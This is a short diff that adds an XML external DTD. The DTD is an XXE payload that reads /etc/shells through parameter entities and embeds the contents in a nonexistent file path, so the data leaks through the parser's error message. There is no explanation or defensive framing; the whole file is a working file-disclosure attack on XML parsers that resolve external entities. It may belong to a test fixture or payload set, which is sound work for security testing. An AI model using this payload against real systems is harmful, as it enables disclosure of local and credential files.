@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/shells">
+<!ENTITY % run "<!ENTITY &#x25; exfil SYSTEM 'file:///asd/%file;'>">
+%run;
+%exfil;
